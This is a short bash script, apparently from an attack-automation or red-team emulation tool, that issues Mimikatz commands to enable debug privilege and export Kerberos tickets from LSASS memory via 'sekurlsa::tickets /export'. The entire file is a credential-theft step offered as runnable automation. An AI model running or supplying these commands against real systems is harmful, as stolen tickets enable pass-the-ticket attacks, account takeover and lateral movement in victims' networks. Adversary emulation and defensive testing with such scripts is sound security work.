#!/bin/bash

: '
Mimikatz: export tickets
'

execute_command "privilege::debug"
create_new_line
sleep 1

execute_command "sekurlsa::tickets /export"
create_new_line
